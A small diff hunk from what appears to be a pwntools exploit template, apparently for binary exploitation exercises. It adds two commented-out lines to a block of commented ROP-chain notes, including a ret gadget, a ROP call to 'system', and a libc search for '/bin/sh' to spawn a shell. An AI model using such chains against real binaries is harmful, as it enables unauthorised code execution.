@@ -85,6 +85,8 @@ def main():
     # rop(rax=constants.SYS_read, rdi=constants.STDIN_FILENO, rsi=0x6b7000, rdx=0x9)
     # set raw or set to an address of (specific gadget) here is eax gadget 
     # rop.raw(rop.eax) 
+    # ELF_ROP.raw(ELF_ROP.find_gadget(['ret'])[0])
+    # ELF_ROP.call('system', [ELF_FILE.sym.whatsThis])
     # rop.raw(0x12345678)
     # rop.rsi = 0
     # rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
